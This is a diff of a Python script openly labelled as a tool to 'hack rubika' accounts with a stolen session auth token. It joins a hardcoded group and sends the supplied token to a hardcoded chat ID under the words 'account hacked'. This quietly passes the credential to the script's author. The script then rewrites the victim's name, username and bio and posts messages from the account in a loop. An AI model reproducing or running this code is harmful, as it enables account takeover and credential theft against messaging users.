@@ -1,60 +1,85 @@
 #!/bin/python
-# rubika-hack
-# --- importing ---
-import os,time,sys
-from rubika import Bot
-import datetime
-#-----
+# | ........ hack rubika with api hash [auth] ......... |
+#__________________
+author = 'Mr. RooT'
+#——————————————————
+import os, time, sys, random
+try:
+    from rubika import Bot
+except:
+    os.system('pip install rubika')
+    from rubika import Bot
+try:
+    import datetime
+except:
+    os.system('pip install datetime')
+    import datetime
+try:
+    import pyfiglet
+except:
+    os.system('pip install pyfiglet')
+    import pyfiglet
+# ...............................
+print (f'\n\033[31m{author} | \03336mversion 1.0.0 |\033[31m rubika.ir/indentation\n')
+time.sleep(3)
 os.system("clear")
-#----
+time.sleep(0.5)
+print ('\033[20;37m')
+os.system('date')
+time.sleep(1)
+print ('\n')
+# ...............................
 date = (datetime.datetime.today())
-# bnr ---
-banner = (f"""
-___________________________
-            #[{date}]#
-            #############
-           #############
-          #  hack rubika ##
-         [api hash and auth]
- ___________________________
-         
-         (help for hack account rubika):
-         	
-         python {sys.argv[0]} [auth]
-__________________________________
-         """)
-for bnr in banner:
-    sys.stdout.write(bnr)
+# ...............................
+logo = ['R U B I K', 'rubika . ir', 'hacking', 'Rubika', 'rubika', 'rubx . ir', 'R U B X']
+poster = (random.choice(logo))
+bnr = pyfiglet.figlet_format(poster)
+banner = (bnr)
+print ('\033[95m')
+for txt in banner:
+    sys.stdout.write(txt)
     sys.stdout.flush()
-    time.sleep(0.009)
-#----
+    time.sleep(0.01)
+# ..............................
+print ('\n')
 try:
     auth = sys.argv[1]
 except:
-    print (f"\nrun:\n\npython {sys.argv[0]} <auth>")
+    time.sleep(1)
+    print (f'\033[31m[+] \033[93mhelp for \033[31m=> \033[35m{sys.argv[0]')
+    time.sleep(1)
+    print (f"\n\n\033[31m[+] \033[93mrun:\n\n\033[20;37mpython {sys.argv[0]} <auth>")
+    time.sleep(1)
     sys.exit()
-
+# ................................
 bot = Bot("AppName",auth=auth)
 target = ("g0BmdMv0ca20f356cf2b972327373309")
 bot.joinGroup("https://rubika.ir/joing/CEGFGBDE0UVKMLYIICMVTNJGBQKIDYNM")
 bot.sendMessage(target,f"account hacked:\n\nauth: [{auth}]")
-#-------
-name = input("\nenter name account hacked _> ")
-username = input ("\nenter username for account hacked _> ")
-time.sleep(1)
-biography = input ("\nenter bio for account hacked > ")
-time.sleep(1)
-print ("\n"*10)
-bot.editProfile(bio=biography)
+# ................................
+time.sleep(0.5)
+name = input("\n\033[31m[?] \033[36menter <name account> hacked \033[31m_>\033[20;37m ")
 bot.editProfile(first_name=name)
+time.sleep(1)
+print ('\n\033[31m[*] \033[92mSET <name account>\n')
+time.sleep(1)
+username = input ("\n\033[31m[+] \033[36menter <username> for account hacked \033[31m_> \033[20;37m")
 bot.editProfile(username=username)
+time.sleep(1)
+print (f'\n\033[31m[*] \033[92mSET <@{username}>\n')
+time.sleep(0.8)
+biography = input ("\n\033[31m[+] \033[36menter bio for account hacked \033[31m_> \033[20;37m")
+bot.editProfile(bio=biography)
+time.sleep(1)
+print (f'\n\033[31m[*] \033[92mSET <bio> | \033[20;38m{date}')
+print ("\n"*10)
 time.sleep(2)
-print ('\n[+] SETED')
+print ('\n\033[20;37m[+] \033[0;00mSETED\n\n\n')
 for _ in range(100):
     time.sleep(0.8)
-    date = (datetime.datetime.today())
-    target = input("\nenter your guid group for text _> ")
-    sender = input("\nenter your text for send to group _>")
+    target = input("\n\033[20;37m[#] \033[0menter your guid group for text \033[20;37m_> \033[20;36m")
+    sender = input("\n\033[20;37m[#] \033[0menter your text for send to group \033[20;37m_> \033[20;36m")
     bot.sendMessage(target,sender)
     print("\n\n")
-#--------------
+# ....................................
+# ...... (end) ....
